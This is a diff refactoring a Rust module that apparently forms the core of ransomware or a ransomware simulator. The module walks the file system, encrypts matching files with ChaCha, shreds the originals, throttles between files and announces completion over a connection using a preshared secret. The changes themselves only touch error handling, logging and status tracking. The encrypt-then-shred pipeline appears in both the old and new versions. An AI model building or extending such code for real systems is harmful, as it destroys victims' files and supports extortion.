@@ -1,15 +1,18 @@
-use flume::{Receiver, Sender};
-use log::{debug, error, info};
-use rand::RngExt;
 use std::{
     fs::OpenOptions,
-    io::{BufWriter, Write},
+    io::{self, BufWriter, Write},
     panic,
     path::PathBuf,
     sync::Arc,
-    thread, time,
+    thread::{self, JoinHandle},
+    time,
 };
-use zeroize::Zeroizing;
+
+use anyhow::Context;
+use flume::{Receiver, Sender, bounded};
+use purecrypto::zeroize::Zeroizing;
+use rand::RngExt;
+use tracing::{debug, error, info};
 
 use crate::{
     canary::{canary_active, filter_canary},
@@ -18,7 +21,7 @@ use crate::{
     config,
     crypto::{aead_encrypt_file, encrypted_file_path, generate_nonce},
     shredder::shred,
-    status::{ANALYSIS_FILENAME, Status, export_status_csv},
+    status::{ANALYSIS_FILENAME, EncryptionState, Status, export_status_csv},
     walker::{random_walk_with_exts, walk_with_exts},
 };
 
@@ -33,67 +36,79 @@ pub struct EncryptionPipeline<'a> {
 }
 
 fn spawn_encrypt_stage(
-    handles: &mut Vec<thread::JoinHandle<()>>,
+    handles: &mut Vec<JoinHandle<()>>,
     input: &Receiver<Arc<PathBuf>>,
     output: &Sender<Arc<PathBuf>>,
     count: usize,
     sym_key: &Arc<Zeroizing<[u8; 32]>>,
     aad: &Arc<[u8]>,
-) {
+) -> io::Result<()> {
     for _ in 0..count {
         handles.push(encrypt(
             input.clone(),
             output.clone(),
             Arc::clone(sym_key),
             Arc::clone(aad),
-        ));
+        )?);
     }
+    Ok(())
 }
 
 fn spawn_shred_stage(
-    handles: &mut Vec<thread::JoinHandle<()>>,
+    handles: &mut Vec<JoinHandle<()>>,
     input: &Receiver<Arc<PathBuf>>,
     count: usize,
-) {
+) -> io::Result<()> {
     for _ in 0..count {
-        handles.push(shred(input.clone()));
+        handles.push(shred(input.clone())?);
     }
+    Ok(())
 }
 
+#[tracing::instrument(skip_all)]
 #[allow(clippy::needless_pass_by_value)]
-pub fn run_encryption_pipeline(cfg: EncryptionPipeline<'_>) -> Result<(), String> {
+pub fn run_encryption_pipeline(cfg: EncryptionPipeline<'_>) -> anyhow::Result<()> {
     debug!("Starting encryption process");
 
-    cfg.status.encryption_started = true;
+    cfg.status.state = EncryptionState::Started;
     export_status_csv(cfg.exe_path_dir.as_ref(), cfg.status)
-        .map_err(|error| format!("Failed to update status CSV: {error}"))?;
+        .context("failed to update status CSV")?;
 
-    let (walk_tx, walk_rx) = flume::bounded(channel_capacity(cfg.thread_counts.encrypt));
+    let (walk_tx, walk_rx) = bounded(channel_capacity(cfg.thread_counts.encrypt));
     let mut thread_handles = Vec::new();
 
     if config::RANDOM_ORDER {
-        thread_handles.push(random_walk_with_exts(
-            walk_tx.clone(),
-            None,
-            None,
-            cfg.thread_counts.walk,
-            Some(config::MAX_ENCRYPT_FILE_BYTES),
-        ));
+        thread_handles.push(
+            random_walk_with_exts(
+                walk_tx.clone(),
+                None,
+                None,
+                cfg.thread_counts.walk,
+                Some(config::MAX_ENCRYPT_FILE_BYTES),
+            )
+            .context("failed to spawn random walk coordinator")?,
+        );
     } else {
-        thread_handles.push(walk_with_exts(
-            walk_tx.clone(),
-            None,
-            None,
-            cfg.thread_counts.walk,
-            Some(config::MAX_ENCRYPT_FILE_BYTES),
-        ));
+        thread_handles.push(
+            walk_with_exts(
+                walk_tx.clone(),
+                None,
+                None,
+                cfg.thread_counts.walk,
+                Some(config::MAX_ENCRYPT_FILE_BYTES),
+            )
+            .context("failed to spawn walk coordinator")?,
+        );
     }
     drop(walk_tx);
 
     let work_receiver = if canary_active() {
-        let (filter_tx, filter_rx) = flume::bounded(channel_capacity(cfg.thread_counts.encrypt));
+        let (filter_tx, filter_rx) = bounded(channel_capacity(cfg.thread_counts.encrypt));
         for _ in 0..cfg.thread_counts.canary {
-            thread_handles.push(filter_canary(walk_rx.clone(), filter_tx.clone()));
+            thread_handles.push(
+                filter_canary(walk_rx.clone(), filter_tx.clone())
+                    .context("failed to spawn canary filter worker")?,
+            );
         }
         drop(walk_rx);
         drop(filter_tx);
@@ -103,9 +118,12 @@ pub fn run_encryption_pipeline(cfg: EncryptionPipeline<'_>) -> Result<(), String
     };
 
     if config::ANALYZE_MODE {
-        thread_handles.push(record(work_receiver, Arc::clone(cfg.exe_path_dir)));
+        thread_handles.push(
+            record(work_receiver, Arc::clone(cfg.exe_path_dir))
+                .context("failed to spawn analysis recorder")?,
+        );
     } else {
-        let (crypt_tx, crypt_rx) = flume::bounded(channel_capacity(cfg.thread_counts.shred));
+        let (crypt_tx, crypt_rx) = bounded(channel_capacity(cfg.thread_counts.shred));
         spawn_encrypt_stage(
             &mut thread_handles,
             &work_receiver,
@@ -113,10 +131,12 @@ pub fn run_encryption_pipeline(cfg: EncryptionPipeline<'_>) -> Result<(), String
             cfg.thread_counts.encrypt,
             cfg.sym_key,
             cfg.aad,
-        );
+        )
+        .context("failed to spawn encryption workers")?;
         drop(work_receiver);
         drop(crypt_tx);
-        spawn_shred_stage(&mut thread_handles, &crypt_rx, cfg.thread_counts.shred);
+        spawn_shred_stage(&mut thread_handles, &crypt_rx, cfg.thread_counts.shred)
+            .context("failed to spawn shred workers")?;
         drop(crypt_rx);
     }
 
@@ -126,19 +146,19 @@ pub fn run_encryption_pipeline(cfg: EncryptionPipeline<'_>) -> Result<(), String
         }
     }
 
-    cfg.status.encryption_complete = true;
+    cfg.status.state = EncryptionState::Complete;
     if let Err(error) = export_status_csv(cfg.exe_path_dir.as_ref(), cfg.status) {
-        error!("Failed to update status CSV: {error}");
+        error!(error = ?error, "Failed to update status CSV");
     }
 
     if let Err(error) = announce_completion(cfg.conn, cfg.status, cfg.preshared_secret) {
-        error!("Failed to announce completion: {error}");
+        error!(error = ?error, "Failed to announce completion");
     }
     Ok(())
 }
 
-fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
-    thread::spawn(move || {
+fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> io::Result<JoinHandle<()>> {
+    thread::Builder::new().spawn(move || {
         let analysis_file_path = path.join(ANALYSIS_FILENAME.as_str());
         let file = match OpenOptions::new()
             .append(true)
@@ -147,7 +167,7 @@ fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinH
         {
             Ok(file) => file,
             Err(error) => {
-                error!("Failed to open analysis file for recording: {error}");
+                error!(error = ?error, "Failed to open analysis file for recording");
                 return;
             }
         };
@@ -156,13 +176,13 @@ fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinH
         loop {
             let Some(file_path) = recv_path(&receiver) else {
                 if let Err(error) = analysis_file.flush() {
-                    error!("Failed to flush analysis file: {error}");
+                    error!(error = ?error, "Failed to flush analysis file");
                 }
                 return;
             };
 
             if let Err(error) = writeln!(analysis_file, "{}", file_path.to_string_lossy()) {
-                error!("Failed to write to analysis file: {error}");
+                error!(error = ?error, "Failed to write to analysis file");
             }
         }
     })
@@ -179,7 +199,7 @@ fn apply_throttle() {
     } else {
         wait_time
     };
-    debug!("Sleeping {secs} seconds before next encryption");
+    debug!(?secs, "Sleeping before next encryption");
     thread::sleep(time::Duration::from_secs(secs));
 }
 
@@ -188,9 +208,9 @@ pub fn encrypt(
     sender: Sender<Arc<PathBuf>>,
     key: Arc<Zeroizing<[u8; 32]>>,
     aad: Arc<[u8]>,
-) -> thread::JoinHandle<()> {
+) -> io::Result<JoinHandle<()>> {
     debug!("Starting encryption crypto thread");
-    thread::spawn(move || {
+    thread::Builder::new().spawn(move || {
         loop {
             let Some(file_path) = recv_path(&receiver) else {
                 return;
@@ -202,7 +222,7 @@ pub fn encrypt(
                 let aad = Arc::clone(&aad);
                 let sender = sender.clone();
                 move || {
-                    info!("Encrypting file: {file_path:?}");
+                    info!(path = %file_path.display(), "Encrypting file");
 
                     let full_nonce_bytes = generate_nonce();
                     let encrypted_file_path = encrypted_file_path(
@@ -212,10 +232,10 @@ pub fn encrypt(
                     );
 
                     debug!(
-                        "Applying ChaCha with source {}, destination {}, and nonce {:?} ",
-                        file_path.as_ref().display(),
-                        encrypted_file_path.display(),
-                        full_nonce_bytes
+                        source = %file_path.as_ref().display(),
+                        destination = %encrypted_file_path.display(),
+                        ?full_nonce_bytes,
+                        "Applying ChaCha"
                     );
                     match aead_encrypt_file(
                         file_path.as_ref(),
@@ -227,14 +247,15 @@ pub fn encrypt(
                     ) {
                         Ok(()) => {
                             debug!(
-                                "Successfully applied ChaCha to data for encryption: {file_path:?}"
+                                path = %file_path.display(),
+                                "Successfully applied ChaCha to data for encryption"
                             );
                             if let Err(error) = sender.send(file_path.clone()) {
-                                error!("Failed to send path to shredder thread: {error}");
+                                error!(error = ?error, "Failed to send path to shredder thread");
                             }
                         }
                         Err(error) => {
-                            error!("Failed to apply ChaCha to data for encryption: {error:?}");
+                            error!(error = ?error, "Failed to apply ChaCha to data for encryption");
                         }
                     }
 
@@ -243,7 +264,7 @@ pub fn encrypt(
             });
 
             if result.is_err() {
-                error!("Encryption thread recovered from panic on file: {file_path:?}");
+                error!(path = %file_path.display(), "Encryption thread recovered from panic");
             }
         }
     })
